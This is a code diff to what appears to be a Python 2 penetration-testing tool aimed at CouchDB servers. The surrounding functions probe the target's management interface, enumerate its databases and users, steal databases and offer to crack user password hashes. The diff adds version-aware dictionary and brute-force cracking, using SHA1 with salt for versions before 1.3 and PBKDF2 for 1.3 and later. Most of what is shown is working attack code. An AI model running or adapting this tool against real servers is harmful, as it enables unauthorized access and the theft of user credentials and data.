@@ -19,6 +19,9 @@ import couchdb
 import urllib
 import requests
 import sys
+import unittest
+from pbkdf2 import PBKDF2
+from binascii import a2b_hex
 import string
 import itertools
 from hashlib import sha1
@@ -113,7 +116,7 @@ def netAttacks(target,port, myIP):
         return
 
 	
-    mgtUrl = "http://" + target + ":5984/"	
+    mgtUrl = "http://" + target + ":5984/_utils"	
     #Future rev:  Add web management interface parsing
     try:
         mgtRespCode = urllib.urlopen(mgtUrl).getcode()
@@ -194,7 +197,7 @@ def enumDbs (couchConn,target):
             crack = raw_input("Crack this hash (y/n)? ")
             
             if crack in yes_tag:
-                passCrack(userNames[x],userHashes[x],userSalts[x])
+                passCrack(userNames[x],userHashes[x],userSalts[x],couchConn.version())
 
         
     return
@@ -242,7 +245,7 @@ def stealDBs (myDB, couchConn, target):
         raw_input ("Something went wrong.  Are you sure your CouchDB is running and options are set? Press enter to return...")
         return
     
-def passCrack (user, encPass, salt):
+def passCrack (user, encPass, salt, dbVer):
     select = True
     print "Select password cracking method: "
     print "1-Dictionary Attack"
@@ -254,11 +257,11 @@ def passCrack (user, encPass, salt):
 
             if select == "1":
                 select = False
-                dict_pass(encPass,salt)
+                dict_pass(encPass,salt,dbVer)
                 
             elif select == "2":
                     select = False
-                    brute_pass(encPass,salt)
+                    brute_pass(encPass,salt,dbVer)
 
             elif select == "3":
                     return
@@ -267,7 +270,7 @@ def passCrack (user, encPass, salt):
 def genBrute(chars, maxLen):
     return (''.join(candidate) for candidate in itertools.chain.from_iterable(itertools.product(chars, repeat=i) for i in range(1, maxLen + 1)))
 
-def brute_pass(hashVal,salt):
+def brute_pass(hashVal,salt,dbVer):
     charSel = True
     print "\n"
     maxLen = raw_input("Enter the maximum password length to attempt: ")
@@ -303,11 +306,17 @@ def brute_pass(hashVal,salt):
     for attempt in genBrute (chainSet,int(maxLen)):
         print "\rCombinations tested: " + str(count) + "\r"
         count += 1
-        if sha1(attempt+salt).hexdigest() == hashVal:
-                print "Found - "+attempt 
-                return
+        
+        #CouchDB hashing method changed starting with v1.3.  Decide based on DB version which hash method to use.
+        if float(dbVer[0:3]) < 1.3:
+            gotIt = gen_pass_couch(attempt,salt,hashVal)
+        else:
+            gotIt = gen_pass_couch13(attempt, salt, 10, hashVal)
+            
+        if gotIt == True:
+                break
 
-def dict_pass(key,salt):
+def dict_pass(key,salt,dbVer):
     loadCheck = False
     
     while loadCheck == False:
@@ -325,8 +334,13 @@ def dict_pass(key,salt):
     
     for passGuess in passList:
         temp = passGuess.split("\n")[0]
-        gotIt = gen_pass_couch(temp,salt,key)
         
+        #CouchDB hashing method changed starting with v1.3.  Decide based on DB version which hash method to use.
+        if float(dbVer[0:3]) < 1.3:
+            gotIt = gen_pass_couch(temp,salt,key)
+        else:
+            gotIt = gen_pass_couch13(temp, salt, 10, key)
+    
         if gotIt == True:
             break
 
@@ -334,8 +348,17 @@ def dict_pass(key,salt):
 
 def gen_pass_couch(passw, salt, hashVal):
     if sha1(passw+salt).hexdigest() == hashVal:
-        print "Found - "+passw
+        print "Password Cracked - "+passw
         return True
         
     else:
         return False
+    
+def gen_pass_couch13(passw, salt, iterations, hashVal):
+	result=PBKDF2(passw,salt,iterations).read(20)
+	expected=a2b_hex(hashVal)
+	if result==expected:
+		print "Password Cracked- "+passw
+		return True
+	else:
+		return False
